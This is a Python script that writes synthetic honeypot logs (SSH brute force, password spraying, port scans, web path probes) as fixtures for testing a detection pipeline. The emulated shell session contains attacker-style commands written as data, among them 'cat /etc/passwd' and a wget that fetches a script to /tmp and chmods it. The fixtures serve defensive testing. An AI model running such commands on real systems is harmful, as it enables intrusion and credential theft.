#!/usr/bin/env python3
"""
Generate SYNTHETIC sensor log files for HLPA-DS.

This writes fabricated log records in the exact on-disk JSON formats that
Cowrie, OpenCanary and the HTTP decoy produce. No network traffic is generated
and no service is contacted - these are static log fixtures used to demonstrate
and test the detection pipeline (the collector tails them like real logs).

All addresses are from RFC 5737 TEST-NET ranges (documentation only). All
credentials and content are invented. Output goes to samples/generated/.

Usage:
    python generate_samples.py [--out DIR] [--base-time ISO8601]

The files it writes:
    cowrie.json           SSH/Telnet records (brute force, multi-account, session cmds)
    opencanary.log        FTP/MySQL/Redis/VNC records (service probing, guessing)
    http_decoy.json       web requests (path probing, flood, login attempts, egress self-test)
    MANIFEST.json         what each block is meant to trigger, for the test harness
"""
from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import os
import uuid
from datetime import datetime, timedelta, timezone

REDACTION_KEY = os.environ.get("REDACTION_KEY", "change-me-lab-only").encode()
SENSOR_UUID = "11111111-2222-3333-4444-555555555555"

# Documentation-only source addresses (RFC 5737).
A_BRUTE = "203.0.113.10"       # DET-01 brute force source
A_SPRAY1 = "203.0.113.21"      # DET-02 distributed guessing
A_SPRAY2 = "203.0.113.22"
A_SESSION = "203.0.113.30"     # DET-04 session commands
A_SCAN = "203.0.113.40"        # DET-03 port scan
A_WEB = "203.0.113.50"         # DET-05 web probing
A_FLOOD = "203.0.113.60"       # DET-06 high frequency
A_IOC = "198.51.100.23"        # DET-07 known indicator (seeded in indicators.yml)
A_BENIGN = "203.0.113.200"     # below-threshold benign source (negative test)

DECOY_SSH = "10.66.0.10"
DECOY_CANARY = "10.66.0.11"
DECOY_WEB = "10.66.0.12"


def fp(secret: str) -> str:
    return hmac.new(REDACTION_KEY, secret.encode(), hashlib.sha256).hexdigest()[:16]


class Clock:
    """Deterministic, monotonic-ish clock for reproducible fixtures."""

    def __init__(self, base: datetime):
        self.t = base

    def tick(self, seconds: float) -> datetime:
        self.t = self.t + timedelta(seconds=seconds)
        return self.t

    def at(self, offset: float) -> datetime:
        return self.t + timedelta(seconds=offset)


def iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).isoformat(timespec="microseconds").replace("+00:00", "Z")


def oc_time(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")


# --------------------------------------------------------------------------- Cowrie records

def cowrie_connect(c, src, session):
    t = c.tick(0.4)
    return {"eventid": "cowrie.session.connect", "src_ip": src, "src_port": 40000 + hash(session) % 20000,
            "dst_ip": DECOY_SSH, "dst_port": 22, "session": session, "protocol": "ssh", "sensor": "decoy-ssh",
            "timestamp": iso(t), "message": f"New connection: {src}"}


def cowrie_login(c, src, session, user, password, success=False):
    t = c.tick(0.3)
    return {"eventid": "cowrie.login.success" if success else "cowrie.login.failed",
            "src_ip": src, "src_port": 40000 + hash(session) % 20000, "dst_ip": DECOY_SSH, "dst_port": 22,
            "session": session, "protocol": "ssh", "sensor": "decoy-ssh", "username": user, "password": password,
            "timestamp": iso(t), "message": f"login attempt [{user}/{password}] {'succeeded' if success else 'failed'}"}


def cowrie_command(c, src, session, cmd):
    t = c.tick(1.2)
    return {"eventid": "cowrie.command.input", "src_ip": src, "src_port": 40000 + hash(session) % 20000,
            "dst_ip": DECOY_SSH, "dst_port": 22, "session": session, "protocol": "ssh", "sensor": "decoy-ssh",
            "input": cmd, "timestamp": iso(t), "message": f"CMD: {cmd}"}


# --------------------------------------------------------------------------- OpenCanary records

def oc_record(c, logtype, src, dst_port, logdata, gap=0.5):
    t = c.tick(gap)
    return {"dst_host": DECOY_CANARY, "dst_port": dst_port, "src_host": src, "src_port": 50000 + hash((src, dst_port)) % 15000,
            "logtype": logtype, "node_id": "decoy-canary", "local_time": oc_time(t), "utc_time": oc_time(t),
            "logdata": logdata}


# --------------------------------------------------------------------------- HTTP decoy records

def http_record(c, rec, gap=0.3):
    t = c.tick(gap)
    return {"ts": iso(t), "sensor_id": "decoy-web", **rec}


# --------------------------------------------------------------------------- scenario builders

def build(base_time: datetime):
    cowrie, canary, http = [], [], []
    manifest = []

    # ---- DET-01: brute force (8 failed SSH logins from one source within ~3s)
    c = Clock(base_time)
    sess = "brute01session"
    cowrie.append(cowrie_connect(c, A_BRUTE, sess))
    pws = ["123456", "admin", "root", "password", "letmein", "qwerty", "toor", "pass123"]
    for pw in pws:
        cowrie.append(cowrie_login(c, A_BRUTE, sess, "root", pw, success=False))
    manifest.append({"rule": "DET-01", "source": A_BRUTE, "expect_severity": "high",
                     "desc": "8 failed SSH logins within the 60s window"})

    # ---- DET-02: multi-account guessing (5 distinct usernames across 2 sources on canary FTP)
    c = Clock(base_time + timedelta(seconds=30))
    for i, user in enumerate(["oracle", "postgres", "jenkins", "git", "tomcat"]):
        src = A_SPRAY1 if i % 2 == 0 else A_SPRAY2
        canary.append(oc_record(c, 2000, src, 21, {"USERNAME": user, "PASSWORD": f"Spring{i}2026!"}, gap=1.0))
    manifest.append({"rule": "DET-02", "source": f"{A_SPRAY1}/{A_SPRAY2}", "expect_severity": "medium",
                     "desc": "5 distinct usernames against one decoy within 120s"})

    # ---- DET-04: suspicious emulated-shell commands (discovery + download + persistence)
    c = Clock(base_time + timedelta(seconds=90))
    sess = "session04shell"
    cowrie.append(cowrie_connect(c, A_SESSION, sess))
    cowrie.append(cowrie_login(c, A_SESSION, sess, "backup", "backup", success=True))
    for cmd in ["uname -a", "cat /etc/passwd", "whoami",
                "wget http://198.51.100.5/m.sh -O /tmp/m.sh",
                "chmod 777 /tmp/m.sh", "crontab -l"]:
        cowrie.append(cowrie_command(c, A_SESSION, sess, cmd))
    manifest.append({"rule": "DET-04", "source": A_SESSION, "expect_severity": "high",
                     "desc": "emulated session issued discovery/download/persistence commands"})

    # ---- DET-03: service/port probing (12 distinct canary ports from one source within 30s)
    c = Clock(base_time + timedelta(seconds=150))
    probe_ports = [21, 1433, 3306, 5000, 6379, 9418, 139, 445, 3389, 5432, 8080, 8443]
    for p in probe_ports:
        canary.append(oc_record(c, 5001, A_SCAN, p, {"msg": {"logdata": "SYN"}}, gap=1.5))
    manifest.append({"rule": "DET-03", "source": A_SCAN, "expect_severity": "medium",
                     "desc": "12 distinct ports touched within 30s"})

    # ---- DET-05: web path probing (admin/sensitive paths)
    c = Clock(base_time + timedelta(seconds=200))
    for path in ["/.env", "/wp-login.php", "/phpmyadmin/", "/admin/", "/backup/db.sql", "/.git/config"]:
        http.append(http_record(c, {"type": "http_request", "src_ip": A_WEB, "src_port": 51000,
                                     "dst_ip": DECOY_WEB, "dst_port": 80, "method": "GET", "path": path,
                                     "status": 404, "user_agent": "Mozilla/5.0 (compatible; test-scan)"}, gap=1.0))
    manifest.append({"rule": "DET-05", "source": A_WEB, "expect_severity": "medium",
                     "desc": "repeated requests for admin/sensitive paths"})

    # ---- DET-06: high-frequency interaction (65 web requests in ~6s)
    c = Clock(base_time + timedelta(seconds=260))
    for i in range(65):
        http.append(http_record(c, {"type": "http_request", "src_ip": A_FLOOD, "src_port": 52000 + i,
                                     "dst_ip": DECOY_WEB, "dst_port": 80, "method": "GET",
                                     "path": f"/index.html?i={i}", "status": 200,
                                     "user_agent": "python-requests/2.31"}, gap=0.09))
    manifest.append({"rule": "DET-06", "source": A_FLOOD, "expect_severity": "low",
                     "desc": "65 events within the 10s window"})

    # ---- DET-07: known indicator match (source on the seeded indicator list)
    c = Clock(base_time + timedelta(seconds=330))
    http.append(http_record(c, {"type": "http_request", "src_ip": A_IOC, "src_port": 53000,
                                 "dst_ip": DECOY_WEB, "dst_port": 80, "method": "GET", "path": "/",
                                 "status": 200, "user_agent": "curl/8.0"}, gap=0.5))
    manifest.append({"rule": "DET-07", "source": A_IOC, "expect_severity": "high",
                     "desc": "source address is on the local indicator list"})

    # ---- DET-08: isolation breach (egress self-test reports an ALLOWED outbound - should never happen)
    c = Clock(base_time + timedelta(seconds=340))
    http.append(http_record(c, {"type": "egress_check", "target": "8.8.8.8:443",
                                 "outcome": "allowed", "detail": "connected"}, gap=0.5))
    manifest.append({"rule": "DET-08", "source": "decoy-web", "expect_severity": "critical",
                     "desc": "egress self-test reached an external host (simulated isolation breach)"})

    # ---- login attempt on the web console (redaction demonstration)
    c = Clock(base_time + timedelta(seconds=345))
    http.append(http_record(c, {"type": "login_attempt", "src_ip": A_WEB, "src_port": 51010,
                                 "dst_ip": DECOY_WEB, "dst_port": 80, "path": "/login", "username": "administrator",
                                 "credential_fp": fp("Winter2026!"), "credential_len": 11, "outcome": "failed",
                                 "user_agent": "Mozilla/5.0"}, gap=0.5))

    # ---- benign / negative (T-06): a few scattered events below every threshold
    c = Clock(base_time + timedelta(seconds=400))
    cowrie.append(cowrie_connect(c, A_BENIGN, "benignsess"))
    cowrie.append(cowrie_login(c, A_BENIGN, "benignsess", "guest", "guest", success=False))
    http.append(http_record(c, {"type": "http_request", "src_ip": A_BENIGN, "src_port": 54000,
                                 "dst_ip": DECOY_WEB, "dst_port": 80, "method": "GET", "path": "/",
                                 "status": 200, "user_agent": "Mozilla/5.0"}, gap=5))
    manifest.append({"rule": "none", "source": A_BENIGN, "expect_severity": None,
                     "desc": "below-threshold benign activity: must NOT raise a high-severity alert"})

    # ---- a few decoy heartbeats so health looks alive
    c = Clock(base_time + timedelta(seconds=410))
    for _ in range(3):
        http.append(http_record(c, {"type": "heartbeat", "listening_ports": [80, 445, 3389]}, gap=30))
        http.append(http_record(c, {"type": "egress_check", "target": "api:4000", "outcome": "blocked",
                                     "detail": "name resolution failed"}, gap=0.2))

    return cowrie, canary, http, manifest


def write_lines(path, records):
    with open(path, "w", encoding="utf-8") as fh:
        for r in records:
            fh.write(json.dumps(r, separators=(",", ":")) + "\n")


def main():
    ap = argparse.ArgumentParser(description="Generate synthetic HLPA-DS sensor logs")
    ap.add_argument("--out", default=os.path.join(os.path.dirname(__file__), "generated"))
    ap.add_argument("--base-time", default=None, help="ISO8601 base time (default: 1 hour ago)")
    args = ap.parse_args()

    base = datetime.fromisoformat(args.base_time) if args.base_time else datetime.now(timezone.utc) - timedelta(hours=1)
    if base.tzinfo is None:
        base = base.replace(tzinfo=timezone.utc)

    cowrie, canary, http, manifest = build(base)
    os.makedirs(args.out, exist_ok=True)
    write_lines(os.path.join(args.out, "cowrie.json"), cowrie)
    write_lines(os.path.join(args.out, "opencanary.log"), canary)
    write_lines(os.path.join(args.out, "http_decoy.json"), http)
    with open(os.path.join(args.out, "MANIFEST.json"), "w", encoding="utf-8") as fh:
        json.dump({"base_time": iso(base), "counts": {"cowrie": len(cowrie), "opencanary": len(canary), "http_decoy": len(http)},
                   "scenarios": manifest}, fh, indent=2)
    print(f"wrote {len(cowrie)} cowrie, {len(canary)} opencanary, {len(http)} http records to {args.out}")


if __name__ == "__main__":
    main()
